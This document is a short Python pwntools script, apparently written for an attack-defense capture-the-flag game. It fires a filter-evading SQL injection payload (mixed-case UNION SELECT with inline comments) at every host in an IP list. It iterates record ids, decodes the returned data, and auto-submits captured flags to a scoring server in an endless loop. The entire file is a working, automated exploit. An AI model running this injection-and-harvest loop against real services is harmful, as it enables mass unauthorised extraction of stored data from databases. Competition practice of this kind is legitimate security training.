from pwn import *
import binascii

magicstring ="send ''/**/unIOn/**/sEleCt/**/data||'','joke'/**/fRoM/**/store/**/whERe/**/id/**/=/**/"

flagSubmit = ("10.0.13.37", "1337")


port = "9122"

while True:
	sentflags = open("flags", "rb")
	flags = sentflags.read()
	sentflags.close()
	sentflags = open("flags", "ab")
	ips = open("ips")
	for host in ips.readlines():
		remotehost = (host[:-1], port)

		io = remote(*remotehost)
		flag = remote(*flagSubmit)

		for i in range(1, 40000):
			io.sendline(magicstring + str(i))
			io.recvline(timeout = 0.01)
			line = io.recvline(False, timeout=0.01)
			if line == b"Key not in Database" or line == b"": break
			try:
				line = binascii.unhexlify(line)
			except:
				log.info(b"Error on line" + line)
				break
			if line[0:3] == b"ENO":
				if line not in flags:
					flag.sendline(line)
					log.info(flag.recvline())
					sentflags.write(line)

		log.info("Done with this host")
	sentflags.close()
	ips.close()
	sleep(10)
